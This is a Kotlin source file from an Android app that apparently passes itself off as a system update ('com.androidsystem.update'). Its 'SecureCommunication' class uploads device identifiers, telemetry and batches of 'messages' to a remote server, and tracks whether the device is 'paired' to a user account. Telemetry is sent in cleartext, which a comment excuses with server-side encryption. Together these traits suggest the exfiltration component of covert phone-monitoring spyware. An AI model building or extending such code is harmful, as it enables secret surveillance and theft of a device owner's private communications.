package com.androidsystem.update.network

import android.content.Context
import android.util.Log
import com.androidsystem.update.BuildConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class SecureCommunication @Inject constructor(
    private val context: Context,
    private val networkManager: NetworkManager
) {

    companion object {
        private const val TAG = "SecureCommunication"
        private const val CONNECT_TIMEOUT = 30000
        private const val READ_TIMEOUT = 30000
    }

    enum class Priority { LOW, NORMAL, HIGH }

    /**
     * Result of a telemetry POST. `paired` is true when the server reports the
     * device is already bound to a user account (heartbeat response).
     */
    data class TelemetryResult(val success: Boolean, val paired: Boolean = false)

    private data class ServerResponse(val ok: Boolean, val body: String)

    private val deviceId by lazy {
        android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    /**
     * Server contract (POST /api/v2/telemetry): the payload must carry the
     * telemetry fields in cleartext — device_id, timestamp, status, battery,
     * interval, plus optional pairing_code / pairing_request for the pairing
     * handshake. Encryption is applied server-side (at rest), so the app sends
     * the raw fields and lets the server read them.
     */
    suspend fun sendTelemetry(data: JSONObject, priority: Priority = Priority.NORMAL): TelemetryResult =
        withContext(Dispatchers.IO) {
            if (!networkManager.isOnline()) return@withContext TelemetryResult(false)
            try {
                val payload = JSONObject(data.toString())
                if (!payload.has("device_id")) payload.put("device_id", deviceId)
                if (!payload.has("timestamp")) payload.put("timestamp", System.currentTimeMillis())
                val response = postToServer("/telemetry", payload.toString())
                val paired = try {
                    JSONObject(response.body).optBoolean("paired", false)
                } catch (e: Exception) {
                    false
                }
                TelemetryResult(response.ok, paired)
            } catch (e: Exception) {
                Log.e(TAG, "sendTelemetry failed", e)
                TelemetryResult(false)
            }
        }

    /**
     * Server contract (POST /api/v2/data): body is { device_id, timestamp,
     * messages: [...] }. The server encrypts the batch at rest; each message's
     * content is already encrypted client-side before it lands in the batch.
     */
    suspend fun sendBatch(batchData: String): Boolean =
        withContext(Dispatchers.IO) {
            if (!networkManager.isOnline()) return@withContext false
            try {
                val messages = JSONArray(batchData)
                val payload = JSONObject().apply {
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                    put("messages", messages)
                }
                postToServer("/data", payload.toString()).ok
            } catch (e: Exception) {
                Log.e(TAG, "sendBatch failed", e)
                false
            }
        }

    private fun postToServer(endpoint: String, body: String): ServerResponse {
        val url = URL(BuildConfig.SERVER_URL + endpoint)
        val conn = url.openConnection() as HttpURLConnection
        return try {
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Device-Id", deviceId)
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.doOutput = true
            conn.outputStream.use { it.write(body.toByteArray()) }
            val responseCode = conn.responseCode
            val responseBody = if (responseCode in 200..299) {
                conn.inputStream?.bufferedReader()?.use { it.readText() } ?: ""
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
            }
            if (responseCode !in 200..299) {
                Log.w(TAG, "POST $endpoint -> $responseCode: $responseBody")
            }
            ServerResponse(responseCode in 200..299, responseBody)
        } catch (e: Exception) {
            Log.e(TAG, "POST $endpoint failed", e)
            ServerResponse(false, "")
        } finally {
            conn.disconnect()
        }
    }
}
